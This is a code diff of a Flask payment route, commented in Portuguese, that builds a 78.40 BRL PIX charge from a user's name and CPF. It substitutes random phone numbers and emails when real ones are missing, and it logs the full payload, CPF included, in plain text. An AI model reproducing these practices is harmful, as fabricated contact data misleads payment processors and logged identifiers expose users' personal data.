@@ -615,15 +615,20 @@ def format_phone_number(phone: str) -> str:
     # Remove todos os caracteres não numéricos
     phone = ''.join(filter(str.isdigit, phone))
 
-    # Se não começar com 55 (código do Brasil), adiciona
-    if not phone.startswith('55'):
-        phone = '55' + phone
+    # Se o número já tiver 55 no início, remove para padronizar
+    if phone.startswith('55'):
+        phone = phone[2:]
 
-    # Garante que tenha pelo menos 10 dígitos após o código do país
-    if len(phone) < 12:  # 55 + 10 dígitos
+    # Remove o 9 extra do início do número, se existir
+    if len(phone) > 2 and phone[2] == '9':
+        phone = phone[:2] + phone[3:]
+
+    # Garante que tenha exatamente 10 dígitos (DDD + número)
+    if len(phone) != 10:
         return None
 
-    return phone
+    # Adiciona o código do país (55)
+    return f"55{phone}"
 
 @app.route('/pagamento', methods=['GET', 'POST'])
 def pagamento():
@@ -638,25 +643,34 @@ def pagamento():
         # Formata o telefone adequadamente
         phone = format_phone_number(user_data.get('telefone', ''))
         if not phone:
-            # Se não houver telefone válido, gera um número aleatório
             phone = generate_random_phone()
+            logger.info(f"Usando telefone gerado aleatoriamente: {phone}")
+
+        # Garante que temos um email válido
+        email = user_data.get('email', '')
+        if not email or '@' not in email:
+            email = generate_random_email()
+            logger.info(f"Usando email gerado aleatoriamente: {email}")
 
         payment_data = {
             'name': user_data['nome_real'], 
-            'email': user_data.get('email', ''), 
+            'email': email,
             'cpf': user_data['cpf'],
             'phone': phone,
             'amount': 78.40  # Valor da tarifa transacional
         }
 
+        logger.info(f"Enviando dados para API de pagamento: {payment_data}")
         pix_data = payment_api.create_pix_payment(payment_data)
+        logger.info(f"Resposta da API de pagamento: {pix_data}")
+
         return render_template('pagamento.html',
                            pix_data=pix_data,
                            valor_total="78,40",
                            current_year=datetime.now().year)
 
     except Exception as e:
-        logger.error(f"Erro ao gerar pagamento: {e}")
+        logger.error(f"Erro ao gerar pagamento: {str(e)}")
         flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
         return redirect(url_for('index'))
 
@@ -884,10 +898,11 @@ def generate_random_email():
 
 def generate_random_phone() -> str:
     """
-    Gera um número de telefone aleatório no formato brasileiro
+    Gera um número de telefone aleatório no formato brasileiro aceito pela API
     """
     ddd = str(random.randint(11, 99))
-    numero = ''.join([str(random.randint(0, 9)) for _ in range(9)])
+    # Gera 8 dígitos para o número (sem o 9 na frente)
+    numero = ''.join([str(random.randint(0, 9)) for _ in range(8)])
     return f"55{ddd}{numero}"
 
 def generate_random_email() -> str:
